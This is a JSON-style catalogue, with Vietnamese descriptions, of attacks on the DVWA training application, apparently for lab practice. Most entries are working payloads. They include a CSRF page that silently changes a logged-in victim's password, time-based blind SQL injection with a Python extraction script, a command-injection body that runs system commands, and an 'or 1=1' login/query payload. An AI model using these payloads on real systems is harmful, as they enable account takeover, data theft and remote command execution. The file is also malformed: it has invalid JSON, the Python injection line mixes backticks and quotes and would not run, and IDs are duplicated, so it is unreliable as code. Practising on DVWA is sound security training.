[
  {
    "id": "A01",
    "vulnerability": "CSRF",
    "url": "/vulnerabilities/csrf/",
    "attack_scenario": "Trình duyệt nạn nhân đang đăng nhập DVWA. Kẻ tấn công gửi 1 URL dẫn đến 1 trang độc hại – khi nạn nhân mở trang đó, form sẽ tự GET tới endpoint thay đổi mật khẩu, server cấp phát thành công vì không kiểm tra token.",
    "exploit_example_html": "<html>
                                <body>
                                    <script>
                                        document.location='http://localhost:4280/vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change';
                                    </script>
                                </body>
                            </html>",
    "expected_behavior": "Server chấp nhận request và thay đổi mật khẩu.",
  },
  {
    "id": "A04",
    "vulnerability": "Insecure CAPTCHA",
    "url": "/vulnerabilities/captcha/",
    "attack_scenario": "Thay đổi password mà không cần xác thực captcha.",
    "method": "POST",
    "body": "step=2&password_new=123&password_conf=123&g-recaptcha-response=&Change=Change",
  },
  {
    "id": "A04",
    "vulnerability": "Open HTTP Redirect",
    "url": " /vulnerabilities/open_redirect/source/low.php",
    "attack_scenario": "Kẻ tấn công có thể lừa nạn nhân truy cập vào một URL độc hại mà không cần xác thực.",
    "method": "GET",
    "parameter": "?redirect=https://github.com/LamChanKhai",
  },
   {
    "id": "A03",
    "vulnerability": "SQL Injection (Blind)",
    "url": "/vulnerabilities/sqli_blind/",
    "attack_scenario": "Gửi các payload SQL Injection time base để lấy version của database.",
    "method": "GET",
    "parameter": "?id=' union select 1,if(substring((select @@version),1,1)='1',sleep(3),0); -- -&Submit=Submit",
    "automated_file": "
                        import requests
                        import string
                        import time
                        charset = string.digits + '.' + string.ascii_lowercase + string.ascii_uppercase + '_-'
                        url = 'http://127.0.0.1:4280/vulnerabilities/sqli_blind/?id='
                        cookie = {'security': 'low', 'PHPSESSID': '3685f4f741c10c019c5ab1492845bf8f'}
                        version = ''
                        for i in range(100):
                            print('Finding character at position: ' + str(i))
                            for c in charset:
                                print('Testing character: ' + c)
                                injection = `' union select 1,if(substring((select @@version)," + str(i) + ",1)='" + c + "',sleep(4),0); -- -`
                                full_url = url + requests.utils.quote(injection) + '&Submit=Submit'
                                start_time = time.time()
                                res = requests.get(full_url, cookies=cookie)
                                end = time.time()
                                if end - start_time >= 1:
                                    print('Found character: ' + c)
                                    version += c
                                    break
                            print('Current version: ' + version)"
    },
    {
    "id": "A04",
    "vulnerability": "Authorisation Bypass",
    "url": " /vulnerabilities/authbypass/",
    "attack_scenario": "Kẻ tấn công truy cập trực tiếp vào trang admin mà không cần quyền",
    "method": "GET",
    },
    {
    "id": "A03",
    "vulnerability": "Command Injection",
    "url": " /vulnerabilities/exec/",
    "attack_scenario": "Kẻ tấn công chèn mã hệ thống để RCE",
    "method": "POST",
    "body": "ip=;whoami;hostname&Submit=Submit",
    },
    {
    "id": "A03",
    "vulnerability": "SQL Injection",
    "url": "/vulnerabilities/sqli/",
    "attack_scenario": "Kẻ tấn công chèn mã truy vấn SQL để lấy danh sách user và password",
    "method": "POST",
    "body": "id=' or 1=1 -- -&Submit=Submit",
    },
]